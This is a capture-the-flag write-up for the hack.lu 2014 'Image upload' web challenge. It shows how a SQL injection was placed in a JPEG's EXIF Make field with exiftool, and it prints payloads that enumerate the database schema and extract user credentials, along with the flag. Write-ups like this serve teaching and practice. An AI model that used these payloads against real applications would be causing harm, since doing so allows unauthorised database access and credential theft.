### Solved by Swappage and barrebas

Image upload was a web challenge for the hack.lu CTF, providing a login form, and the possibility to upload images.

![](/images/2014/hack.lu/wildwildweb/imageupload.png)

What I could immediatelly notice was that there was a pretty strong sanitization of the uploaded content, both in terms of mimetype as well as for the file extension; it was possible to upload php code of course, but you would need to upload it as .jpg, and make sure the mimetype in the multypart form data was correct or an error was returned.

plus, once an image was uploaded, it was modified and embedded into a mugshot.

![](/images/2014/hack.lu/wildwildweb/uploaded.png)

So the way of the file inclusion wasn't a good idea, as most likely the code would have been scrumbled, modified or messed up, resulting in something broken.

Yet, if we were to look at the bottom of every image, we could notice that there were fields ready for displaying images detail in case they were present.

![](/images/2014/hack.lu/wildwildweb/metadata.png)

Author, Manufacturer, and Model are EXIF metadata in jpg images, so the application was probably reading these metadata from our uploaded images, and store them into the database for displaying them later.

So i decided it was worth a shot and try to trigger a SQL injection.

By using exiftool, a command line tool for displaying and manipulating exif metadata in various documents and images formats, I tried modifying the Manufacturer field by a *'*

	exiftool -Make="'" image.jpg
	
and the web application reacted badly complying about an error in inserting data into the database.

Ok, nice, so we most likely had a SQL Injection.

It took me some trial and error but finally, with the precious help of Barrebas we found a way to correctly close the insert query and have proper responses in the metadata fields; by storing the following string in the Make metadata

	a', @@version ) -- #

we were presented with a nice result

![](/images/2014/hack.lu/wildwildweb/sqli.png)

At this point i started enumerating the database replacing the *@@version* with proper queries that would eventually provide me with the informations about the databases, schemas and tables.

I found the database namw was chal:
	exiftool -Make="a', (SELECT schema_name FROM information_schema.schemata where schema_name != 'mysql' AND schema_name != 'information_schema' LIMIT 1) ) -- #"

Started enumerating tables in the database
```sql
	SELECT table_name FROM information_schema.tables WHERE table_schema = 'chal' LIMIT 1
```

till I finally reached the users table

![](/images/2014/hack.lu/wildwildweb/tablename.png)

At this point i needed the fields name

```sql
	SELECT column_name FROM information_schema.columns WHERE table_schema = 'chal' AND table_name = 'users' LIMIT 1
```
which resulted being *id, name* and *password*

to finally extract them

```sql
	SELECT concat(name, ';', password) from chal.users LIMIT 1
```

![](/images/2014/hack.lu/wildwildweb/login.png)

Using the credentials displayed in the above image it was possible to login in the web application and receive the flag.

	You are sucessfully logged in.
	Flag: flag{1_5h07_7h3_5h3r1ff}
	
